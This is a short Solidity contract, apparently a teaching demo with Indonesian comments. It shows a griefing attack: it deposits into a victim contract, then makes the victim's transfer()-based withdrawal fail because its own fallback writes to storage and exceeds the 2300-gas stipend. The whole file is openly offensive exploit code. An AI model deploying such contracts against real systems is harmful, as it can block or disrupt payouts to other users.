// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

contract GriefingAttacker {
    fallback() external payable {
        // Fallback ini akan gagal karena mencoba menulis ke storage
        // dan melebihi gas 2300 yang diberikan oleh transfer()
        assembly {
            sstore(0x0, 0x1)
        }
    }

    function attack(address _victim) external payable {
        (bool success, ) = _victim.call{value: msg.value}(abi.encodeWithSignature("deposit()"));
        require(success, "deposit failed");

        // Saat withdraw, akan gagal karena fallback kita tidak bisa dieksekusi
        (bool ok, ) = _victim.call(abi.encodeWithSignature("withdraw()"));
        require(ok, "withdraw failed");
    }
}
